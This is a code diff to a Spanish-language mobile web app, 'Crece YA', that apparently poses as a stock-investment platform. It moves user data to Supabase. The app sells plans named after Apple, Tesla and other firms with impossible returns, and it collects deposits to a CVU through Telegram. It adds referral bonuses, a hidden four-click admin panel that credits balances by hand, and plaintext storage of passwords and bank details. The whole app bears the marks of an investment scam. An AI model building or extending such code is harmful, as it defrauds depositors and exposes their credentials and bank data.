@@ -5,6 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>Crece YA - Inversiones Bursátiles</title>
   <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
     body {
@@ -82,7 +83,7 @@
   <main class="w-full max-w-sm bg-[#e0f2fe] border-x sm:border border-sky-200 min-h-screen sm:rounded-3xl shadow-2xl flex flex-col justify-between relative pb-20">
 
     <div>
-      <!-- HEADER CON TU NUEVO LOGO Y DETECTOR ADMIN (4 CLICS) -->
+      <!-- HEADER CON LOGO Y DETECTOR ADMIN (4 CLICS) -->
       <header class="p-3 flex items-center justify-between border-b border-sky-200/80 bg-white/70 backdrop-blur-md sticky top-0 z-30">
         <div class="flex items-center gap-2 cursor-pointer select-none" id="admin-logo-trigger">
           <img src="./logo.png" alt="Crece YA" class="h-9 w-auto object-contain">
@@ -144,10 +145,8 @@
           </div>
         </div>
 
-        <!-- Catálogo de Planes con Rutas PNG Locales -->
-        <div id="plans-container" class="space-y-3">
-          <!-- Inyectado por JS -->
-        </div>
+        <!-- Catálogo de Planes -->
+        <div id="plans-container" class="space-y-3"></div>
       </div>
 
       <!-- ================= VISTA 2: 📦 PRODUCTOS ================= -->
@@ -258,7 +257,7 @@
           </button>
         </div>
 
-        <!-- Ficha de Datos Bancarios Sin Nombres Prellenados -->
+        <!-- Ficha de Datos Bancarios -->
         <div class="p-3.5 bg-white border border-sky-200 rounded-2xl space-y-2.5 text-xs">
           <div class="flex justify-between items-center">
             <span class="font-bold text-slate-800">Cuenta Bancaria para Retiros</span>
@@ -330,11 +329,10 @@
       </button>
     </nav>
 
-    <!-- ================= MODAL BILLETERA DELICADO (CAPTURA OSCURA) ================= -->
+    <!-- ================= MODAL BILLETERA ================= -->
     <div id="wallet-modal" class="fixed inset-0 z-50 bg-[#020912]/85 backdrop-blur-md hidden flex items-center justify-center p-3">
       <div class="bg-[#0b1726] border border-sky-900/60 w-full max-w-sm rounded-3xl p-4 shadow-2xl space-y-3.5 text-slate-100">
         
-        <!-- Header Billetera -->
         <div class="flex items-center justify-between border-b border-slate-800/80 pb-2">
           <div class="flex items-center gap-2">
             <button onclick="closeWalletModal()" class="text-slate-400 hover:text-white text-sm">
@@ -347,7 +345,6 @@
           </button>
         </div>
 
-        <!-- Selector Pestañas Recargar / Retirar -->
         <div class="grid grid-cols-2 p-1 bg-[#132337] rounded-xl text-xs font-bold">
           <button id="wallet-tab-recargar" onclick="setWalletMode('recargar')" class="py-2 rounded-lg bg-sky-500 text-slate-950 transition">
             Recargar
@@ -357,7 +354,6 @@
           </button>
         </div>
 
-        <!-- Saldo Disponible en Billetera -->
         <div class="p-3 bg-[#132337]/70 rounded-2xl border border-sky-900/40 flex justify-between items-center text-xs">
           <span class="text-slate-400">Monto disponible</span>
           <strong id="wallet-available-bal" class="font-mono text-sm text-sky-400">$0.00 ARS</strong>
@@ -365,7 +361,6 @@
 
         <!-- SECCIÓN RECARGA -->
         <div id="wallet-recarga-box" class="space-y-3">
-          <!-- CVU Oficial de Depósito -->
           <div class="p-3 bg-[#132337]/50 border border-sky-800/50 rounded-2xl space-y-1">
             <div class="flex justify-between items-center text-[10px] text-slate-400 font-mono">
               <span>CVU OFICIAL DE DEPÓSITO</span>
@@ -379,7 +374,6 @@
             </div>
           </div>
 
-          <!-- Selección de Monto -->
           <div>
             <label class="text-[10px] text-slate-400 block mb-1">Seleccionar monto de recarga</label>
             <div class="grid grid-cols-2 gap-1.5 text-xs font-mono">
@@ -428,7 +422,6 @@
             </div>
           </div>
 
-          <!-- Contraseña de Fondos -->
           <div>
             <div class="flex items-center bg-[#132337] border border-slate-800 rounded-xl px-3 py-2 text-xs">
               <i class="fa-solid fa-lock text-slate-400 mr-2"></i>
@@ -444,7 +437,7 @@
       </div>
     </div>
 
-    <!-- ================= MODAL ADMIN OCULTO (161928) ================= -->
+    <!-- ================= MODAL ADMIN (161928) ================= -->
     <div id="admin-modal" class="fixed inset-0 z-50 bg-black/85 backdrop-blur-xs hidden flex items-center justify-center p-4">
       <div class="bg-white border border-amber-400 w-full max-w-sm rounded-3xl p-4 shadow-2xl space-y-3">
         <div class="flex items-center justify-between border-b pb-2">
@@ -499,11 +492,14 @@
 
   </main>
 
-  <!-- ================= LÓGICA JAVASCRIPT ================= -->
+  <!-- ================= LÓGICA SUPABASE & APP ================= -->
   <script>
-    // --- 12 PLANES CON ARCHIVOS PNG LOCALES ---
+    // Configuración Supabase
+    const SUPABASE_URL = "https://jsixgpftuhtepudyektf.supabase.co";
+    const SUPABASE_ANON_KEY = "sb_publishable_1I5At-aenvWS_w6YhDLu9w_rkAeGHjL";
+    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
     const plans = [
-      // CATEGORÍA INICIAL (1 a 6)
       { id: 'meli', name: 'MELI (Mercado Libre)', cat: 'inicial', cost: 2000, days: 2, daily: 2500, total: 7000, slotsTotal: 15, slotsLeft: 8, color: '#f59e0b', btnBg: 'bg-amber-400 hover:bg-amber-300 text-slate-950', border: 'border-amber-300', logo: './meli.png' },
       { id: 'tiktok', name: 'TikTok (ByteDance)', cat: 'inicial', cost: 3500, days: 3, daily: 3000, total: 12500, slotsTotal: 12, slotsLeft: 7, color: '#06b6d4', btnBg: 'bg-cyan-500 hover:bg-cyan-400 text-white', border: 'border-cyan-300', logo: './tiktok.png' },
       { id: 'apple', name: 'AAPL (Apple Inc.)', cat: 'inicial', cost: 5000, days: 5, daily: 3200, total: 21000, slotsTotal: 12, slotsLeft: 6, color: '#1e293b', btnBg: 'bg-slate-900 hover:bg-slate-800 text-white', border: 'border-slate-300', logo: './apple.png' },
@@ -511,7 +507,6 @@
       { id: 'amazon', name: 'AMZN (Amazon)', cat: 'inicial', cost: 12000, days: 10, daily: 5300, total: 65000, slotsTotal: 10, slotsLeft: 5, color: '#ea580c', btnBg: 'bg-orange-500 hover:bg-orange-400 text-white', border: 'border-orange-300', logo: './amazon.png' },
       { id: 'netflix', name: 'Netflix (Streaming)', cat: 'inicial', cost: 15000, days: 10, daily: 7000, total: 85000, slotsTotal: 10, slotsLeft: 4, color: '#e50914', btnBg: 'bg-red-600 hover:bg-red-500 text-white', border: 'border-red-300', logo: './netflix.png' },
       
-      // CATEGORÍA PRO / VIP (7 a 12)
       { id: 'nvidia', name: 'NVDA (NVIDIA AI)', cat: 'pro', cost: 20000, days: 3, daily: 15000, total: 65000, slotsTotal: 3, slotsLeft: 3, color: '#16a34a', btnBg: 'bg-emerald-600 hover:bg-emerald-500 text-white', border: 'border-emerald-300', logo: './nvidia.png' },
       { id: 'instagram', name: 'Instagram (Meta)', cat: 'pro', cost: 25000, days: 12, daily: 9500, total: 139000, slotsTotal: 8, slotsLeft: 4, color: '#e11d48', btnBg: 'bg-rose-600 hover:bg-rose-500 text-white', border: 'border-rose-300', logo: './instagram.png' },
       { id: 'tesla', name: 'TSLA (Tesla Motors)', cat: 'pro', cost: 35000, days: 15, daily: 14000, total: 245000, slotsTotal: 8, slotsLeft: 4, color: '#dc2626', btnBg: 'bg-red-600 hover:bg-red-500 text-white', border: 'border-red-400', logo: './tesla.png' },
@@ -520,37 +515,62 @@
       { id: 'microsoft', name: 'MSFT (Microsoft)', cat: 'pro', cost: 200000, days: 40, daily: 60000, total: 2600000, slotsTotal: 3, slotsLeft: 1, color: '#0284c7', btnBg: 'bg-sky-600 hover:bg-sky-500 text-white', border: 'border-sky-300', logo: './microsoft.png' }
     ];
 
-    // --- ESTADO ---
     let appState = {
       phone: localStorage.getItem('cy_phone') || '',
       pass: localStorage.getItem('cy_pass') || '',
-      name: localStorage.getItem('cy_name') || '',
-      cvu: localStorage.getItem('cy_cvu') || '',
-      alias: localStorage.getItem('cy_alias') || '',
-      balance: parseFloat(localStorage.getItem('cy_bal')) || 0,
-      pending: parseFloat(localStorage.getItem('cy_pending')) || 0,
-      withdrawn: parseFloat(localStorage.getItem('cy_withdrawn')) || 0,
-      lastClaim: parseInt(localStorage.getItem('cy_claim')) || 0,
-      lastWithdraw: parseInt(localStorage.getItem('cy_last_withdraw')) || 0,
-      activePlans: JSON.parse(localStorage.getItem('cy_active_plans')) || [],
-      invites: JSON.parse(localStorage.getItem('cy_invites')) || [],
-      txs: JSON.parse(localStorage.getItem('cy_txs')) || []
+      name: '',
+      cvu: '',
+      alias: '',
+      balance: 0,
+      pending: 0,
+      withdrawn: 0,
+      lastClaim: 0,
+      lastWithdraw: 0,
+      activePlans: [],
+      invites: [],
+      txs: []
     };
 
-    function saveState() {
-      localStorage.setItem('cy_phone', appState.phone);
-      localStorage.setItem('cy_pass', appState.pass);
-      localStorage.setItem('cy_name', appState.name);
-      localStorage.setItem('cy_cvu', appState.cvu);
-      localStorage.setItem('cy_alias', appState.alias);
-      localStorage.setItem('cy_bal', appState.balance);
-      localStorage.setItem('cy_pending', appState.pending);
-      localStorage.setItem('cy_withdrawn', appState.withdrawn);
-      localStorage.setItem('cy_claim', appState.lastClaim);
-      localStorage.setItem('cy_last_withdraw', appState.lastWithdraw);
-      localStorage.setItem('cy_active_plans', JSON.stringify(appState.activePlans));
-      localStorage.setItem('cy_invites', JSON.stringify(appState.invites));
-      localStorage.setItem('cy_txs', JSON.stringify(appState.txs));
+    async function syncWithSupabase(fetchOnly = false) {
+      if (!appState.phone) return;
+      if (!fetchOnly) {
+        await supabase.from('usuarios').upsert({
+          phone: appState.phone,
+          pass: appState.pass,
+          name: appState.name,
+          cvu: appState.cvu,
+          alias: appState.alias,
+          balance: appState.balance,
+          pending: appState.pending,
+          withdrawn: appState.withdrawn,
+          last_claim: appState.lastClaim,
+          last_withdraw: appState.lastWithdraw
+        }, { onConflict: 'phone' });
+      } else {
+        const { data, error } = await supabase.from('usuarios').select('*').eq('phone', appState.phone).single();
+        if (data && !error) {
+          appState.name = data.name || '';
+          appState.cvu = data.cvu || '';
+          appState.alias = data.alias || '';
+          appState.balance = parseFloat(data.balance) || 0;
+          appState.pending = parseFloat(data.pending) || 0;
+          appState.withdrawn = parseFloat(data.withdrawn) || 0;
+          appState.lastClaim = parseInt(data.last_claim) || 0;
+          appState.lastWithdraw = parseInt(data.last_withdraw) || 0;
+        }
+
+        const { data: cData } = await supabase.from('contratos').select('*').eq('user_phone', appState.phone).eq('status', 'activo');
+        if (cData) {
+          appState.activePlans = cData.map(c => ({
+            id: c.id,
+            name: c.name,
+            cost: parseFloat(c.cost),
+            total: parseFloat(c.total),
+            days: c.days,
+            endTime: parseInt(c.end_time)
+          }));
+        }
+      }
       renderUI();
     }
 
@@ -558,7 +578,6 @@
       return new Intl.NumberFormat('es-AR').format(Math.round(n));
     }
 
-    // --- SPLASH SCREEN (2 SEGUNDOS) ---
     window.addEventListener('DOMContentLoaded', () => {
       setTimeout(() => {
         const splash = document.getElementById('splash-screen');
@@ -569,25 +588,24 @@
       }, 2000);
     });
 
-    // --- CAPTCHA GENERADOR ---
     let currentCaptcha = '4821';
     function generateCaptcha() {
       currentCaptcha = Math.floor(1000 + Math.random() * 9000).toString();
       document.getElementById('captcha-code-display').innerText = currentCaptcha;
     }
 
-    // --- AUTENTICACIÓN / REGISTRO ---
-    function checkAuth() {
+    async function checkAuth() {
       if (appState.phone && appState.pass) {
         document.getElementById('auth-screen').classList.add('hidden');
         document.getElementById('user-display-phone').innerText = appState.phone;
+        await syncWithSupabase(true);
       } else {
         generateCaptcha();
         document.getElementById('auth-screen').classList.remove('hidden');
       }
     }
 
-    document.getElementById('auth-form').addEventListener('submit', (e) => {
+    document.getElementById('auth-form').addEventListener('submit', async (e) => {
       e.preventDefault();
       const phone = document.getElementById('auth-phone').value.trim();
       const pass = document.getElementById('auth-pass').value;
@@ -606,7 +624,9 @@
 
       appState.phone = phone;
       appState.pass = pass;
-      saveState();
+      localStorage.setItem('cy_phone', phone);
+      localStorage.setItem('cy_pass', pass);
+      await syncWithSupabase(false);
       checkAuth();
     });
 
@@ -617,7 +637,6 @@
       }
     });
 
-    // --- NAVEGACIÓN ---
     let currentCategory = 'inicial';
     window.switchTab = function(tabName) {
       const tabs = ['planes', 'productos', 'compartir', 'perfil'];
@@ -643,7 +662,6 @@
       renderPlans();
     });
 
-    // --- RENDERIZADO DE PLANES CON IMÁGENES LOCALES ---
     function renderPlans() {
       const container = document.getElementById('plans-container');
       container.innerHTML = '';
@@ -695,29 +713,45 @@
       });
     }
 
-    // --- ACCIÓN PLAN ---
-    window.handlePlanClick = function(planId) {
+    window.handlePlanClick = async function(planId) {
       const p = plans.find(item => item.id === planId);
       if (!p) return;
 
       if (appState.balance >= p.cost) {
         if (confirm(`¿Confirmas activar ${p.name} por $${fmt(p.cost)} ARS de tu saldo?`)) {
           appState.balance -= p.cost;
+          const contractId = 'ORD-' + Date.now();
+          const endTimeVal = Date.now() + (p.days * 24 * 60 * 60 * 1000);
+
           appState.activePlans.push({
-            id: 'ORD-' + Date.now(),
+            id: contractId,
             name: p.name,
             cost: p.cost,
             total: p.total,
             days: p.days,
-            logo: p.logo,
-            endTime: Date.now() + (p.days * 24 * 60 * 60 * 1000)
+            endTime: endTimeVal
           });
+
+          await supabase.from('contratos').insert({
+            id: contractId,
+            user_phone: appState.phone,
+            plan_id: p.id,
+            name: p.name,
+            cost: p.cost,
+            daily: p.daily,
+            total: p.total,
+            days: p.days,
+            end_time: endTimeVal,
+            status: 'activo'
+          });
+
           appState.txs.unshift({
             desc: `Activación ${p.name}`,
             amount: -p.cost,
             date: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
           });
-          saveState();
+
+          await syncWithSupabase(false);
           alert(`¡Plan activado con éxito! Monitorea el conteo en "Productos".`);
           switchTab('productos');
         }
@@ -726,7 +760,6 @@
       }
     };
 
-    // --- CONTEO PRODUCTOS ---
     function renderProducts() {
       const container = document.getElementById('active-products-container');
       container.innerHTML = '';
@@ -745,18 +778,14 @@
       }
 
       const now = Date.now();
-      appState.activePlans.forEach((plan, index) => {
+      appState.activePlans.forEach(async (plan, index) => {
         const remaining = plan.endTime - now;
 
         if (remaining <= 0) {
           appState.balance += plan.total;
-          appState.txs.unshift({
-            desc: `Cierre Contrato ${plan.name}`,
-            amount: plan.total,
-            date: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
-          });
           appState.activePlans.splice(index, 1);
-          saveState();
+          await supabase.from('contratos').update({ status: 'finalizado' }).eq('id', plan.id);
+          await syncWithSupabase(false);
           alert(`¡Ciclo culminado! Se acreditaron $${fmt(plan.total)} ARS a tu balance.`);
           return;
         }
@@ -769,10 +798,7 @@
         card.className = "p-3.5 bg-white border border-sky-200 rounded-2xl shadow-xs space-y-2";
         card.innerHTML = `
           <div class="flex justify-between items-center">
-            <div class="flex items-center gap-2">
-              <img src="${plan.logo}" class="w-5 h-5 object-contain">
-              <h4 class="font-bold text-xs text-slate-900">${plan.name}</h4>
-            </div>
+            <h4 class="font-bold text-xs text-slate-900">${plan.name}</h4>
             <span class="text-[10px] font-mono text-emerald-700 bg-emerald-50 border border-emerald-200 px-2 py-0.5 rounded-md font-bold">
               En Operación
             </span>
@@ -797,8 +823,7 @@
     }
     setInterval(renderProducts, 1000);
 
-    // --- CHECK-IN DIARIO ---
-    document.getElementById('btn-claim-daily').addEventListener('click', () => {
+    document.getElementById('btn-claim-daily').addEventListener('click', async () => {
       const now = Date.now();
       if (now - appState.lastClaim < 24 * 60 * 60 * 1000) {
         alert("Ya cobraste tu bono de hoy.");
@@ -806,12 +831,7 @@
       }
       appState.balance += 500;
       appState.lastClaim = now;
-      appState.txs.unshift({
-        desc: "Bono Check-in Diario",
-        amount: 500,
-        date: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
-      });
-      saveState();
+      await syncWithSupabase(false);
       alert("¡+$500 ARS acreditados!");
     });
 
@@ -836,7 +856,6 @@
     }
     setInterval(updateCheckinCooldown, 1000);
 
-    // --- BILLETERA MODAL DELICADA (RECARGAR / RETIRAR) ---
     window.openWalletModal = function(mode) {
       document.getElementById('wallet-modal').classList.remove('hidden');
       setWalletMode(mode);
@@ -876,19 +895,25 @@
 
     window.setDepositValue = (v) => document.getElementById('deposit-custom-input').value = v;
 
-    window.notifyDepositTelegram = function() {
+    window.notifyDepositTelegram = async function() {
       const val = parseFloat(document.getElementById('deposit-custom-input').value) || 2000;
       if (val < 2000) {
         alert("El monto mínimo de recarga es de $2.000 ARS.");
         return;
       }
       appState.pending += val;
-      saveState();
+      await supabase.from('solicitudes').insert({
+        user_phone: appState.phone,
+        type: 'recarga',
+        amount: val,
+        net_amount: val,
+        status: 'pendiente'
+      });
+      await syncWithSupabase(false);
       window.open('https://t.me/TuCanalOficial', '_blank');
       closeWalletModal();
     };
 
-    // Retiros
     window.setWithdrawValue = function(v) {
       document.getElementById('withdraw-custom-input').value = v;
       calcWithdrawNet();
@@ -903,7 +928,7 @@
       document.getElementById('withdraw-net-calc').innerText = `$${fmt(net)} ARS`;
     }
 
-    window.confirmWithdrawAction = function() {
+    window.confirmWithdrawAction = async function() {
       const now = Date.now();
       if (now - appState.lastWithdraw < 24 * 60 * 60 * 1000) {
         alert("Límite diario alcanzado: Solo 1 solicitud de retiro cada 24 hs.");
@@ -926,17 +951,18 @@
 
       appState.balance -= amt;
       appState.lastWithdraw = now;
-      appState.txs.unshift({
-        desc: `Retiro Bancario (Neto: $${fmt(amt * 0.9)})`,
-        amount: -amt,
-        date: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
+      await supabase.from('solicitudes').insert({
+        user_phone: appState.phone,
+        type: 'retiro',
+        amount: amt,
+        net_amount: amt * 0.9,
+        status: 'pendiente'
       });
-      saveState();
+      await syncWithSupabase(false);
       alert("Solicitud de retiro registrada. Procesando en horario bancario.");
       closeWalletModal();
     };
 
-    // --- COMPARTIR ---
     const myRefUrl = `${window.location.origin}${window.location.pathname}?ref=11482019`;
     document.getElementById('ref-link-input').value = myRefUrl;
 
@@ -949,20 +975,18 @@
       window.open(`https://api.whatsapp.com/send?text=${msg}`, '_blank');
     });
 
-    // --- PERFIL ---
     document.getElementById('prof-name-input').value = appState.name;
     document.getElementById('prof-cvu-input').value = appState.cvu;
     document.getElementById('prof-alias-input').value = appState.alias;
 
-    document.getElementById('btn-save-profile').addEventListener('click', () => {
+    document.getElementById('btn-save-profile').addEventListener('click', async () => {
       appState.name = document.getElementById('prof-name-input').value.trim();
       appState.cvu = document.getElementById('prof-cvu-input').value.trim();
       appState.alias = document.getElementById('prof-alias-input').value.trim();
-      saveState();
+      await syncWithSupabase(false);
       alert("Datos bancarios guardados.");
     });
 
-    // --- PANEL ADMIN (4 TOQUES / 161928) ---
     let logoClicks = 0;
     document.getElementById('admin-logo-trigger').addEventListener('click', () => {
       logoClicks++;
@@ -983,97 +1007,48 @@
       }
     });
 
-    document.getElementById('btn-admin-credit').addEventListener('click', () => {
+    document.getElementById('btn-admin-credit').addEventListener('click', async () => {
       const amt = parseFloat(document.getElementById('admin-credit-amount').value) || 0;
       if (amt <= 0) return;
       appState.balance += amt;
       if (appState.pending >= amt) appState.pending -= amt;
-      appState.txs.unshift({
-        desc: "Depósito Aprobado",
-        amount: amt,
-        date: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
-      });
-      saveState();
+      await syncWithSupabase(false);
       alert(`$${fmt(amt)} ARS acreditados.`);
       closeAdminModal();
     });
 
-    document.getElementById('btn-admin-validate-guest').addEventListener('click', () => {
+    document.getElementById('btn-admin-validate-guest').addEventListener('click', async () => {
       appState.balance += 1000;
       appState.invites.push({ phone: "+54 9 11 ... 402", status: "Validado ✓" });
-      appState.txs.unshift({
-        desc: "Recompensa Invitado",
-        amount: 1000,
-        date: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
-      });
-      saveState();
+      await syncWithSupabase(false);
       alert("Invitado validado (+ $1.000 ARS).");
       closeAdminModal();
     });
 
-    document.getElementById('btn-admin-liquidate-w').addEventListener('click', () => {
+    document.getElementById('btn-admin-liquidate-w').addEventListener('click', async () => {
       appState.withdrawn += 5000;
-      saveState();
+      await syncWithSupabase(false);
       alert("Retiro liquidado.");
       closeAdminModal();
     });
 
-    document.getElementById('btn-admin-reject-w').addEventListener('click', () => {
+    document.getElementById('btn-admin-reject-w').addEventListener('click', async () => {
       appState.balance += 5000;
-      saveState();
+      await syncWithSupabase(false);
       alert("Retiro rechazado. Fondos reintegrados.");
       closeAdminModal();
     });
 
-    // --- ACTUALIZACIÓN DE INTERFAZ ---
     function renderUI() {
       document.getElementById('home-balance-display').innerHTML = `$${fmt(appState.balance)} <span class="text-xs font-normal text-slate-400">ARS</span>`;
       document.getElementById('profile-bal-ars').innerText = `$${fmt(appState.balance)}`;
       document.getElementById('profile-pending-ars').innerText = `$${fmt(appState.pending)}`;
       document.getElementById('profile-withdrawn-ars').innerText = `$${fmt(appState.withdrawn)}`;
       document.getElementById('wallet-available-bal').innerText = `$${fmt(appState.balance)} ARS`;
-
-      // Render invitados
-      const invContainer = document.getElementById('invites-list-container');
-      if (appState.invites.length > 0) {
-        invContainer.innerHTML = '';
-        appState.invites.forEach(inv => {
-          invContainer.innerHTML += `
-            <div class="flex justify-between items-center p-2 rounded-xl bg-slate-50 border border-slate-100">
-              <span class="text-slate-700">${inv.phone}</span>
-              <span class="text-emerald-700 bg-emerald-50 px-2 py-0.5 rounded font-bold">${inv.status}</span>
-            </div>
-          `;
-        });
-        document.getElementById('invites-count-badge').innerText = `${appState.invites.length} registrados`;
-      }
-
-      // Render transacciones
-      const txContainer = document.getElementById('tx-history-container');
-      if (appState.txs.length > 0) {
-        txContainer.innerHTML = '';
-        appState.txs.slice(0, 5).forEach(tx => {
-          const isPos = tx.amount > 0;
-          txContainer.innerHTML += `
-            <div class="flex justify-between items-center p-2 bg-slate-50 rounded-xl border border-slate-100">
-              <div>
-                <span class="font-bold text-slate-800 block">${tx.desc}</span>
-                <span class="text-[9px] text-slate-400">${tx.date}</span>
-              </div>
-              <span class="font-bold ${isPos ? 'text-emerald-600' : 'text-slate-800'}">
-                ${isPos ? '+' : ''}$${fmt(tx.amount)} ARS
-              </span>
-            </div>
-          `;
-        });
-      }
-
       renderPlans();
     }
 
-    // Inicializar
     checkAuth();
-    renderUI();
     renderProducts();
   </script>
 </body>
